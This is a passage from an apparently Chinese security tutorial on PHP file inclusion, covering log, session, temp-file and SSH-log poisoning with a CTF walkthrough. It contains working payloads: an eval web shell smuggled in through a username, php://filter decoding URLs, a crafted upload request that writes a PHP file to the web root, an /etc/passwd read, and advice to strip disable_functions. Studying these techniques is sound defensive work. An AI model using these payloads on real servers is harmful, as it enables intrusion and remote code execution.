so 模块加载</p>\n<p>2. 通过 fpm</p>\n<p>3. 通过 cgi</p>\n<p>最佳方式是 apache/Nginx + fastcgi + php fpm</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png\" alt=\"image-20221105161200210\" style=\"zoom:67%;\" />\n<p>因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现</p>\n<p>web 中间件和 phpfpm 的通信方式有两种</p>\n<p>1.socket</p>\n<p>2.TCP 模式</p>\n<p>fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端</p>\n<p>可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节</p>\n<p>recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对</p>\n<p>type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png\" alt=\"image-20221105164011830\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png\" alt=\"image-20221105164219506\"></p>\n<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record</p>\n<p>当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php</p>\n<p>php-Cgi:</p>\n<p>1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&gt; 根据请求参数，返回处理结果</p>\n<p>2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低</p>\n<p>3）修改完 php.ini 文件，启动 php-Cgi 程序不会生效，无法平滑重启</p>\n<h2 id=\"日志包含\"><a class=\"markdownIt-Anchor\" href=\"#日志包含\">#</a> 日志包含</h2>\n<p>一般日志位置 /var/log/httpd/access.log</p>\n<p><strong>将木马写到日志中，知道日志文件名与路径，存在文件包含漏洞</strong></p>\n<p>首先在 url 中写入自己想要执行的内容，比如 <code>127.0.0.1/inlcude?&lt;?php phpinfo(); ?&gt;</code></p>\n<p>但 url 中会被编码，导致无法包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:08 +0800] &quot;GET /html/html/flag.php HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:19 +0800] &quot;GET /html/html/flag.php?%3C?php%20phpinfo();%20?%3E HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以通过抓包，修改为未编码的形式</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030163914509.png\" alt=\"image-20221030163914509\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在包含日志文件即可</p>\n<p>防止文件包含：文件名包含随机数，定期分割文件，更改日志路径</p>\n<p>如果是 bt 面板搭建的，记得关掉 open_basedir</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165251590.png\" alt=\"image-20221030165251590\" style=\"zoom:80%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165348749.png\" alt=\"image-20221030165348749\" style=\"zoom:67%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzYwNTM2NDg=\">open_basedir restriction in effect. 原因与解决方法 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"session包含\"><a class=\"markdownIt-Anchor\" href=\"#session包含\">#</a> session 包含</h2>\n<p>前置知识～:cookie 与 session，这个我在 xss 的开头讲过了</p>\n<p>session 目录:/var/llib/php/session</p>\n<p>文件格式:sess_sessid</p>\n<p><strong>知道 session 的路径，可以控制 session 文件中的内容，存在文件包含</strong></p>\n<p><strong>session 常见存储路径：</strong></p>\n<ul>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/tmp/sess_PHPSESSID</li>\n<li>/tmp/sessions/sess_PHPSESSID</li>\n<li>session 文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>\n</ul>\n<h4 id=\"一道ctf关于session包含的题目\"><a class=\"markdownIt-Anchor\" href=\"#一道ctf关于session包含的题目\">#</a> 一道 CTF 关于 session 包含的题目</h4>\n<p>页面打开之后有 login 和 register 选项，并且点击后 url 长这样:</p>\n<p><code>http://1.1.1.1/index.php?action=login.php</code>   <code>http://1.1.1.1/index.php?action=register.php</code></p>\n<p>很明显，这是通过 include 不同的文件加载不同的页面</p>\n<p>那么就有可能存在文件包含漏洞了</p>\n<p>尝试用 php://filter 读源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: index.php&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select password from user where username=?&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">fetch</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//register.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">set_charset</span>(<span class=\"string\">&quot;utf8&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from user where username=?&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_id</span>, <span class=\"variable\">$res_username</span>, <span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">store_result</span>();</span><br><span class=\"line\">    <span class=\"variable\">$count</span> = <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">num_rows</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$count</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;User name Already Exists&#x27;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into user(username, password) values(?,?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;ss&quot;</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>两个文件都是用 PDO 写的，不存在 sql 注入，config 是数据库用户名与密码，除非他的服务器允许外链，不然没用，index 就包含了两个页面</p>\n<p>但我们注意到：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里使用了 session 来保存用户会话，php 手册中是这样描述的：</p>\n<ol>\n<li>PHP 会将会话中的数据设置到  <code>$_SESSION</code>  变量中。</li>\n<li>当 PHP 停止的时候，它会自动读取  <code>$_SESSION</code>  中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>\n<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>\n</ol>\n</blockquote>\n<p>把我们的用户名 base64 编码后放到了 session 中</p>\n<p>那么可能存在 session 包含了，session 包含的两个条件：1. 知道物理路径与 session 名称，物理路径我们是知道的，session 名称我们可以 f12 查看 2.session 可以写入并且被包含，这一点我们也是满足的</p>\n<p>这样我们可以注册的时候用户名写我们的 php 代码，然后通过 session 包含</p>\n<p>但 session 中是 base64 编码后的，不能直接包含，我们需要在包含前解码，php://filter 就是个很好的解码方法</p>\n<p>注册如下用户名： <code>hahaha</code> ，密码随便写，最终在数据库中的是： <code>username|s:12:&quot;xxxxxxx&quot;</code> xxx 为我们用户名的 base64 编码，12 是 base64 编码的长度</p>\n<p>但 base64 是有特性的他必须 8 位为一组，如果不够会把后面的字符抓过来，此时 <code>username|s:12:&quot;</code>  正好是 15 个字符，为了增加一个字符，我们需要扩展我们的用户名，让他 base64 之后为 100 字符以上，这样我们前 16 个字符被解码为乱码，我们的 php 被正确包含</p>\n<p>比如： <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval($_GET['aaaaaa']) ?&gt;</code></p>\n<p>然后解码，正确包含</p>\n<p><code>http://1.1.1.1/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;aaaaaa=phpinfo();</code></p>\n<p>防御 session：</p>\n<p>修改 session 默认路径和名称</p>\n<p>设置 session 文件夹权限</p>\n<h2 id=\"临时文件包含\"><a class=\"markdownIt-Anchor\" href=\"#临时文件包含\">#</a> 临时文件包含</h2>\n<p>当文件上传时，先存储到临时文件夹，在移动到网站目录下，我们可以通过竞争在删除之前包含，文件名通过通配符找到</p>\n<p>1. 先上传文件</p>\n<p>2. 通过 file 覆盖前一个文件，匹配临时文件</p>\n<p>3. 包含临时文件</p>\n<p>如果是自己的 phpstudy 默认是没有开启</p>\n<p>我们需要修改 upload_tmp_dir = “C:\\Windows\\Temp”</p>\n<p>然后利用文件上传产生的缓存文件进行命令执行，从而 getshell</p>\n<p>假设我们有一个前端页面可以上传文件，后端可以接收上传的文件并进行包含，那么我们就可以利用文件上传时上传到临时目录，在删除之前通过竞争包含</p>\n<p>我们需要解决几个问题：</p>\n<p>1. 如何找到我们的临时文件？</p>\n<p>通过 &gt;，在 Windows 中 &gt; 可以当做通配符使用，很巧，php 的临时文件长这样 php678u，那么我们可以这样匹配 php&gt;&gt;&gt;</p>\n<p>2. 即使我们访问到临时文件，他依然会删除，怎么解决？</p>\n<p>往他网站根目录下写 php 文件，即使我们的临时文件删除了，只要在删除之前包含了，那么我们在网站根目录下的文件就会生成</p>\n<p><code>&lt;?php fputs(fopen('E:\\phpstudy_pro\\www\\aaaaa.php','w'),'&lt;?php phpinfo(); ?&gt;'); ?&gt;</code></p>\n<p>3. 如何构造上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /xss_location/include/windows.php HTTP/1.1</span><br><span class=\"line\">Host: 172.16.60.64</span><br><span class=\"line\">Content-Length: 481</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://172.16.60.64</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://172.16.60.64/xss_location/include/windows.html</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=s3pod5ho262o336afdd8ljvkg7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php fputs(fopen(&#x27;E:\\phpstudy_pro\\www\\aaaaa.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo(); ?&gt;&#x27;); ?&gt;</span><br><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">upload</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw--</span><br></pre></td></tr></table></figure>\n<p>注意：下面几行是需要我们自己构造的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br></pre></td></tr></table></figure>\n<p>yes 的作用是包含成功后的提示符</p>\n<p>name=file 是为了覆盖上一个 name=file，然后匹配临时文件</p>\n<p>php&gt;&gt;&gt;&gt; 就是通配符了，上面解释过</p>\n<p>记得空行的问题，如果报错尝试删除或增加空行</p>\n<p>补充一下 windows 匹配</p>\n<blockquote>\n<p>DOS_STAR：即 &lt;，匹配 0 个以上的字符<br>\n DOS_QM：即 &gt;，匹配 1 个字符<br>\n DOS_DOT：即 &quot;，匹配点号</p>\n</blockquote>\n<p>如果他的 php.ini 下没有设置 upload 这个东西的路径并且还有；，也就是没有设置。</p>\n<p>那么我们也可以直接读取任意文件</p>\n<p>其实也没必要非得文件上传了，本来文件包含后就可以读取了</p>\n<p>临时文件包含条件：</p>\n<blockquote>\n<p>1.php.ini 中的 upload_tmp_dir 下必须有 C:/Windows/Temp 这个路径</p>\n<p>2. 得有写入的权限（这个默认应该都可以）</p>\n<p>3.$_REQUEST 得有，因为他是获取表单信息的一个数组，如果没有它，那么我们就不能进行文件上传来打。</p>\n</blockquote>\n<h2 id=\"ssh文件包含\"><a class=\"markdownIt-Anchor\" href=\"#ssh文件包含\">#</a> SSH 文件包含</h2>\n<p>假设有如下文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];   </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;<span class=\"subst\">$file</span>&quot;</span>);   </span><br><span class=\"line\">    &#125;   <span class=\"keyword\">else</span>   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);   </span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>那么我们就可以包含任意文件，比如 /etc/passwd</p>\n<p><code>[101.35.139.208:9999/lfi.php?file=file:///etc/passwd](http://101.35.139.208:9999/lfi.php?file=file:///etc/passwd)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191034602.png\" alt=\"image-20221031191034602\"></p>\n<p>那么意味着我们其实也可以包含 ssh log</p>\n<p>先看一眼 ssh log 里面有啥</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191351374.png\" alt=\"image-20221031191351374\"></p>\n<p>加入我们登录时构造这样的用户名 <code>ssh root&lt;?php phpinfo();?&gt;@101.35.139.208</code></p>\n<p>那么在我们的 ssh log 中就会存在以下日志</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191502317.png\" alt=\"image-20221031191502317\"></p>\n<p>试着包含一下？</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191635298.png\" alt=\"image-20221031191635298\"></p>\n<p>但是文件很大，你忍一下</p>\n<p>记得在包含前，设置文件的权限 <code>chmod 775 secure</code></p>\n<p>也可以写马，比如</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192425893.png\" alt=\"image-20221031192425893\"></p>\n<p>如果报错 <code>system() has been disabled for security reasons </code> ，无法包含，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192854594.png\" alt=\"image-20221031192854594\"></p>\n<p>把这里的 disable_function 中的你需要使用的函数去掉，重启</p>\n<p><code>service php-fpm restart</code></p>\n<p>web 传递  cs msf</p>\n<p>msf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use 